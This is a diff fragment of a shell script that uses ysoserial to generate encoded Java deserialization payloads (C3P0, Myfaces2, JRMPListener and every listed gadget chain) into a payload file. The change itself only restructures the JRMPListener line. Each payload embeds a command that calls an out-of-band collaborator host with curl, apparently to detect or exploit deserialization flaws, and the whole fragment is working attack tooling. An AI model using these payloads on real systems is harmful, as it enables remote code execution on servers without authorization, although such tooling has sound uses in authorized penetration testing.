@@ -24,7 +24,10 @@ java -jar ysoserial-all.jar C3P0 "https://$Collaborator/:C3P0" 2>&- | $Encoding 
 printf "\n" >> payloads.inc
 java -jar ysoserial-all.jar Myfaces2 "https://$Collaborator/:Myfaces2" 2>&- | $Encoding >> payloads.inc
 printf "\n" >> payloads.inc
-[ "$IP" != "" ] && java -jar ysoserial-all.jar JRMPListener "$IP" 2>&- | $Encoding >> payloads.inc
+if [ "$IP" != "" ];then
+    java -jar ysoserial-all.jar JRMPListener "$IP" 2>&- | $Encoding >> payloads.inc
+    printf "\n" >> payloads.inc
+fi
 for _payload in $(cat out | awk "{print \$1}" | grep -vE "^Y$|Usage:|Available|Sep|INFO:|Payload|-------");do
     java -jar ysoserial-all.jar $_payload "curl curl_$_payload.$Collaborator" 2>&- | $Encoding >> payloads.inc
     printf "\n" >> payloads.inc
